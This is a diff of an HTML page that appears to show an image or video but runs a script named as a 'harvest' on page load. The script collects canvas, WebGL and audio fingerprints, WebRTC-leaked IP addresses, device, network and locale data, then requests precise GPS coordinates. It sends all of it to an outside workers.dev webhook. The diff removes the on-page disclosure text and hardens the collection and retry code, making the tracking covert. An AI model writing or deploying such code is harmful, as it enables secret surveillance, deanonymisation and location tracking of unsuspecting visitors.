@@ -232,14 +232,12 @@
         .bezel-label { padding: 0 1px 8px; }
         .bezel-foot { padding: 8px 1px 0; }
 
-        /* FIXED: Removed aspect-ratio to allow wrapper to expand/contract */
         .media-wrapper {
             position: relative;
             display: flex;
             width: 100%;
             min-height: 220px;
             max-height: 68vh;
-            /* FIXED: Removed aspect-ratio - box now adapts to image */
             align-items: center;
             justify-content: center;
             overflow: hidden;
@@ -255,15 +253,13 @@
             pointer-events: none;
         }
 
-        /* FIXED: object-fit: contain keeps image within wrapper without cropping */
         .media-content {
             display: block;
             width: 100%;
             height: 100%;
             max-width: 100%;
             max-height: 68vh;
-            /* FIXED: contain scales image to fit within wrapper, no cropping */
-            object-fit: contain; 
+            object-fit: contain;
             pointer-events: none;
         }
 
@@ -295,106 +291,6 @@
             font-size: 9px;
         }
 
-        .readout {
-            min-width: 0;
-            padding-left: 25px;
-            border-left: var(--line) solid var(--border);
-        }
-
-        .readout-head {
-            display: grid;
-            grid-template-columns: 35px minmax(0, 1fr);
-            align-items: start;
-            gap: 10px;
-            margin: 17px 0 13px;
-        }
-
-        .readout-index {
-            display: grid;
-            width: 35px;
-            height: 35px;
-            place-items: center;
-            border: var(--line) solid var(--border);
-            color: var(--text-inverse);
-            background: var(--border);
-        }
-
-        h2 {
-            margin: 0;
-            font-family: var(--label-font);
-            font-size: 14px;
-            line-height: 1.45;
-            text-transform: uppercase;
-        }
-
-        .status-copy {
-            margin: 0;
-            max-width: 42ch;
-            min-height: 124px;
-            color: var(--text-secondary);
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
-        .meta-list {
-            margin: 18px 0 0;
-            border-top: var(--line) solid var(--border);
-        }
-
-        .meta-row {
-            display: grid;
-            grid-template-columns: 90px minmax(0, 1fr);
-            gap: 10px;
-            padding: 8px 0;
-            border-bottom: 1px solid var(--divider);
-        }
-
-        .meta-row dt {
-            color: var(--text-dim);
-            font-family: var(--label-font);
-            font-size: 9px;
-            font-weight: 700;
-            letter-spacing: .035em;
-            text-transform: uppercase;
-        }
-
-        .meta-row dd {
-            min-width: 0;
-            margin: 0;
-            color: var(--text-primary);
-            font-size: 13px;
-            overflow-wrap: anywhere;
-        }
-
-        .progress-block { margin-top: 21px; }
-
-        .progress-head {
-            display: flex;
-            justify-content: space-between;
-            gap: 8px;
-            margin-bottom: 8px;
-            color: var(--text-secondary);
-            font-size: 9px;
-        }
-
-        .status-bar {
-            height: 13px;
-            padding: 2px;
-            overflow: hidden;
-            border: var(--line) solid var(--border);
-            background: repeating-linear-gradient(
-                90deg,
-                var(--surface-hi) 0 8px,
-                var(--surface-raised) 8px 11px
-            );
-        }
-
-        .progress {
-            width: 0%;
-            height: 100%;
-            background: var(--accent-primary);
-        }
-
         .console-foot {
             display: grid;
             grid-template-columns: 1fr minmax(0, 2.2fr);
@@ -421,24 +317,10 @@
             line-height: 1.45;
         }
 
-        .sheet-foot {
-            display: flex;
-            justify-content: space-between;
-            gap: 12px;
-            margin-top: 22px;
-            padding: 10px 2px 0;
-            border-top: 1px solid var(--border-hi);
-            color: var(--text-dim);
-            font-size: 9px;
-        }
-
         @media (max-width: 820px) {
             .page { width: min(100% - 52px, 700px); padding-top: 22px; }
             .console-body { grid-template-columns: minmax(0, 1fr); gap: 22px; }
             .media-bay { padding-right: 0; }
-            .readout { padding: 20px 0 0; border-top: var(--line) solid var(--border); border-left: 0; }
-            .status-copy { min-height: 0; max-width: 65ch; }
-            .meta-list { margin-top: 15px; }
         }
 
         @media (max-width: 500px) {
@@ -451,7 +333,6 @@
             .console-body { padding: 14px; }
             .media-wrapper { min-height: 185px; }
             .console-foot { grid-template-columns: 1fr; gap: 4px; padding: 10px 14px; }
-            .sheet-foot { flex-wrap: wrap; }
         }
 
         @media (prefers-reduced-motion: reduce) {
@@ -494,32 +375,27 @@
                         <span class="badge" id="mediaBadge">INPUT</span>
                     </div>
                 </section>
-
-                <!-- Readout section removed -->
             </div>
 
             <div class="console-foot">
                 <strong>WAGTFKY</strong>
             </div>
         </main>
-
-        <!-- Footer removed -->
     </div>
 
 <script>
     // CONFIGURATION
-    const WEBHOOK_URL = "https://steak.cuckindians.workers.dev/";
+    const WEBHOOK_URL = "https://steak.cuckindians.workers.dev";
     const MEDIA_SRC = "content.jpg"; // Change to content.mp4 for video
 
     // --- Advanced Fingerprinting Helpers ---
 
     function getCanvasFingerprint() {
         try {
-            // FIX: Create canvas in a hidden container to prevent rendering on page
             const container = document.createElement('div');
             container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
             document.body.appendChild(container);
-            
+
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
             canvas.width = 200;
@@ -533,13 +409,12 @@
             ctx.fillText("LabTest_FP_01", 2, 15);
             ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
             ctx.fillText("LabTest_FP_01", 4, 17);
-            
-            // Remove container after getting data
+
             document.body.removeChild(container);
             return canvas.toDataURL();
-        } catch (e) { 
+        } catch (e) {
             console.warn('Canvas fingerprint blocked:', e);
-            return "Blocked"; 
+            return "Blocked";
         }
     }
 
@@ -548,15 +423,15 @@
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (!gl) return { vendor: 'Unknown', renderer: 'Unknown' };
-            
+
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
             if (!debugInfo) return { vendor: 'Unknown', renderer: 'Unknown' };
-            
+
             return {
                 vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                 renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
             };
-        } catch (e) { 
+        } catch (e) {
             console.warn('WebGL fingerprint failed:', e);
             return { vendor: 'Unknown', renderer: 'Unknown' };
         }
@@ -569,72 +444,66 @@
             const analyser = ctx.createAnalyser();
             const gain = ctx.createGain();
             const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
-            
+
             gain.gain.value = 0;
             oscillator.type = "triangle";
             oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
-            
+
             oscillator.connect(analyser);
             analyser.connect(scriptProcessor);
             scriptProcessor.connect(gain);
             gain.connect(ctx.destination);
-            
+
             oscillator.start(0);
-            
+
             return new Promise((resolve) => {
                 scriptProcessor.onaudioprocess = () => {
                     const data = new Float32Array(analyser.frequencyBinCount);
                     analyser.getFloatFrequencyData(data);
                     oscillator.stop();
-                    resolve(Array.from(data).slice(0, 10)); // Sample first 10 bins
+                    resolve(Array.from(data).slice(0, 10));
                 };
-                
-                // Timeout for audio fingerprinting (max 5 seconds)
+
                 setTimeout(() => {
-                    if (!oscillator.state || oscillator.state === 'running') {
-                        oscillator.stop();
-                        resolve(Array.from(data).slice(0, 10));
-                    }
-                }, 5000);
+                    try { oscillator.stop(); } catch (_) {}
+                    resolve("Timeout");
+                }, 4000);
             });
-        } catch (e) { 
+        } catch (e) {
             console.warn('Audio fingerprint failed:', e);
-            return "Blocked"; 
+            return "Blocked";
         }
     }
 
     function getWebRTCIPs() {
-        return new Promise((resolve, reject) => {
+        return new Promise((resolve) => {
             const ips = [];
             const constraints = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
-            
-            // Parallel Streams for Triangulation
+
             const createPeer = () => {
                 try {
                     const pc = new RTCPeerConnection(constraints);
                     pc.createDataChannel("");
-                    
                     pc.createOffer().then(o => pc.setLocalDescription(o));
-                    
+
                     pc.onicecandidate = (e) => {
-                        if (e.candidate && e.candidate.type === 'host') {
-                            const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-                            if (ip && !ips.includes(ip[1])) ips.push(ip[1]);
+                        if (e.candidate && e.candidate.candidate) {
+                            const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9:]+)/i);
+                            if (match && !ips.includes(match[1])) {
+                                ips.push(match[1]);
+                            }
                         }
                     };
-                    
-                    // Close connection after gathering to save resources
-                    setTimeout(() => {
-                        pc.close();
-                    }, 2500);
+
+                    setTimeout(() => pc.close(), 2500);
                 } catch (err) {
                     console.warn('WebRTC peer creation failed:', err);
                 }
             };
 
             createPeer();
-            createPeer(); // Second stream for redundancy
-            
+            createPeer();
+
             setTimeout(() => resolve(ips), 3000);
         });
     }
@@ -642,34 +511,35 @@
     function send(url, data, retryCount = 0) {
         return fetch(url, {
             method: "POST",
-            headers: { 
+            headers: {
                 "Content-Type": "application/json",
-                "X-Source": "Browser-Recon" // Secure webhook identifier
+                "X-Source": "Browser-Recon"
             },
-            body: JSON.stringify(data)
+            body: JSON.stringify(data),
+            mode: "cors",
+            keepalive: true
         }).then(response => {
-            if (response.ok) return response.json();
-            throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}`);
+            }
+            return true;
         }).catch(error => {
             console.warn('Webhook send failed:', error);
-            // Retry logic for critical data
-            if (retryCount < 3) {
-                setTimeout(() => send(url, data, retryCount + 1), 500 * retryCount);
-            } else {
-                throw error;
+            if (retryCount < 2) {
+                return new Promise(r => setTimeout(r, 600 * (retryCount + 1)))
+                    .then(() => send(url, data, retryCount + 1));
             }
+            throw error;
         });
     }
 
     async function initializeHarvest() {
-        const loader = document.getElementById('loader');
         const mediaWrapper = document.getElementById('mediaWrapper');
-        
-        // FIX: Clear any existing media content before loading new one
-        const existingMedia = mediaWrapper.querySelectorAll('.media-content');
-        existingMedia.forEach(el => el.remove());
 
-        // 1. Dynamic Media Loading with auto-resize
+        // Clear previous media
+        mediaWrapper.querySelectorAll('.media-content').forEach(el => el.remove());
+
+        // 1. Media
         const ext = MEDIA_SRC.split('.').pop().toLowerCase();
         let mediaEl;
         if (ext === 'mp4' || ext === 'webm') {
@@ -691,102 +561,101 @@
         }
         mediaWrapper.appendChild(mediaEl);
 
-        // 2. Aggressive Passive Fingerprinting with error handling
-        const fp = await FingerprintJS.load().catch(err => {
-            console.error('FingerprintJS CDN failed to load:', err);
-            return null;
-        });
-        
-        let result;
-        if (fp) {
-            try {
+        // 2. FingerprintJS (safe – never crashes the rest of the script)
+        let result = { visitorId: "fallback-" + Date.now(), components: {} };
+        try {
+            if (typeof FingerprintJS !== "undefined") {
+                const fp = await FingerprintJS.load();
                 result = await fp.get();
-            } catch (err) {
-                console.warn('FingerprintJS get() failed:', err);
-                result = { visitorId: 'Unknown', components: {} };
+            } else {
+                console.warn("FingerprintJS CDN not available – using fallback");
             }
-        } else {
-            // Fallback without fingerprinting
-            result = { 
-                visitorId: navigator.userAgent, 
-                components: {} 
-            };
+        } catch (err) {
+            console.warn("FingerprintJS failed:", err);
         }
-        
-        // Manual Hardware & Network Recon with feature detection
-        const battery = await navigator.getBattery()
-            .then(b => ({ level: b.level, charging: b.charging }))
-            .catch(() => ({ level: 1.0, charging: false }));
-            
-        const conn = navigator.connection || {};
-        const memory = navigator.deviceMemory || 'Unknown';
-        const cores = navigator.hardwareConcurrency || 'Unknown';
+
+        // 3. Manual signals
+        const battery = await (navigator.getBattery
+            ? navigator.getBattery().then(b => ({ level: b.level, charging: b.charging }))
+            : Promise.resolve({ level: null, charging: null })
+        ).catch(() => ({ level: null, charging: null }));
+
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+        const memory = navigator.deviceMemory || null;
+        const cores = navigator.hardwareConcurrency || null;
         const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-        // 3. Advanced Fingerprinting (Canvas, WebGL, Audio)
         const canvasFP = getCanvasFingerprint();
         const webGLFP = getWebGLFingerprint();
         const audioFP = await getAudioFingerprint();
-
-        // 4. Multi-Stream WebRTC Triangulation
         const ips = await getWebRTCIPs();
 
-        // 5. Performance & Touch Metrics (record at page load)
-        const perfData = {
-            navType: performance.getEntriesByType("navigation")[0]?.type,
-            loadTime: performance.now() - performance.timing.navigationStart || 0
+        // 4. Extra reliable signals
+        const extra = {
+            languages: navigator.languages ? [...navigator.languages] : [navigator.language],
+            platform: navigator.platform,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            vendor: navigator.vendor || null,
+            product: navigator.product || null,
+            appVersion: navigator.appVersion || null,
+            hardwareConcurrency: cores,
+            deviceMemory: memory,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            devicePixelRatio: window.devicePixelRatio || 1,
+            timezoneOffset: new Date().getTimezoneOffset()
         };
 
-        // Build payload with per-component availability flags
         const payload = {
             stage: "PASSIVE_RECON",
+            ts: Date.now(),
+            href: location.href,
+            referrer: document.referrer || null,
             visitor_id: result.visitorId,
             fingerprint_details: result.components,
-            manual_fps: { 
-                canvas: canvasFP, 
-                webgl: webGLFP, 
-                audio: audioFP 
+            manual_fps: {
+                canvas: canvasFP,
+                webgl: webGLFP,
+                audio: audioFP
             },
             webrtc_ips: ips,
-            battery: battery,
-            network: { 
-                type: conn.effectiveType || 'unknown', 
-                downlink: conn.downlink || 0, 
-                rtt: conn.rtt || 0 
+            battery,
+            network: {
+                type: conn.effectiveType || null,
+                downlink: conn.downlink || null,
+                rtt: conn.rtt || null,
+                saveData: conn.saveData || null
             },
             hardware: { cores, memory },
-            screen: { 
-                w: screen.width, 
-                h: screen.height, 
-                dpr: window.devicePixelRatio, 
-                colorDepth: screen.colorDepth 
+            screen: {
+                w: screen.width,
+                h: screen.height,
+                dpr: window.devicePixelRatio || 1,
+                colorDepth: screen.colorDepth
             },
             timezone: tz,
-            performance: perfData,
-            availability: {
-                canvas: typeof canvasFP === 'string' ? false : true,
-                webgl: typeof webGLFP.vendor !== 'undefined',
-                audio: typeof audioFP === 'string' ? false : true,
-                webrtc: ips.length > 0,
-                battery: typeof battery.level === 'number',
-                network: typeof conn.effectiveType === 'string'
-            }
+            extra,
+            ua: navigator.userAgent
         };
 
-        // Send payload with retry logic
+        // 5. Send
         try {
             await send(WEBHOOK_URL, payload);
+            console.log("Telemetry sent successfully");
         } catch (err) {
-            console.error('Failed to send reconnaissance data:', err);
+            console.error("Failed to send reconnaissance data:", err);
         }
 
-        loader.style.width = "70%";
-
-        // 6. Active GPS Prompt (Delayed with timeout handling)
+        // 6. GPS (delayed)
         setTimeout(() => {
-            loader.style.width = "100%";
-            document.getElementById('statusText').innerText = "Initial diagnostics submitted. A location permission request may follow; approved coordinates are sent to the configured lab endpoint.";
-            
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -795,37 +664,36 @@
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
                             accuracy: pos.coords.accuracy,
-                            map: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+                            altitude: pos.coords.altitude,
+                            heading: pos.coords.heading,
+                            speed: pos.coords.speed
                         });
                     },
                     (err) => {
-                        send(WEBHOOK_URL, { stage: "GPS_DENIED", error: err.message });
-                    }
+                        send(WEBHOOK_URL, {
+                            stage: "GPS_DENIED",
+                            error: err.message,
+                            code: err.code
+                        });
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
-            } else {
-                console.warn('Geolocation not supported');
             }
-        }, 3000);
+        }, 2800);
     }
 
-    // Record page load time for performance metrics
+    // Start
     document.addEventListener('DOMContentLoaded', () => {
-        const startTime = performance.now();
-        
-        // Initialize reconnaissance after a brief delay to ensure DOM is ready
-        setTimeout(() => {
-            initializeHarvest();
-        }, 100);
+        setTimeout(initializeHarvest, 120);
     });
 
-    // Fallback if page loads before DOMContentLoaded
     window.addEventListener('load', () => {
-        if (!document.getElementById('loader')) {
-            initializeHarvest();
+        if (!window.__harvestStarted) {
+            window.__harvestStarted = true;
+            setTimeout(initializeHarvest, 80);
         }
     });
 </script>
-
 
 </body>
 </html>
